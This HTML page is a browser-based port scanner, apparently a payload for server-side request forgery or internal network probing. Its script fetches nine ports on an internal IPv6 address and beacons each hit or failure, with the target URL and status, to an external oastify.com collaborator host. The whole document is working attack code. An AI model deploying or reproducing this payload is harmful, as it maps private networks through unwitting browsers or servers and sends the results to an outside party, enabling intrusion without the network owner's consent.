<!DOCTYPE html>
<html>
<head>
  <title>Port Scanner</title>
  <script>
    const ip = "[fda3:e722:ac3:10:33:dfdf:a05:ad4]";
    const ports = [80, 443, 8080, 3000, 5000, 7001, 9000, 9200, 9999];
    const timestamp = Date.now();

    ports.forEach(port => {
      const url = `https://${ip}:${port}/`;

      fetch(url)
        .then(res => {
          const status = res.status;
          const tag = (status === 404 || status === 400) ? "fail" : "hit";
          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/" + tag +
                            "?target=" + encodeURIComponent(url) +
                            "&status=" + status +
                            "&ts=" + timestamp;
        })
        .catch(() => {
          new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" +
                            "?target=" + encodeURIComponent(url) +
                            "&error=network" +
                            "&ts=" + timestamp;
        });
    });
  </script>
</head>
<body>
  <h1>Port scan in progress 🚀</h1>
</body>
</html>
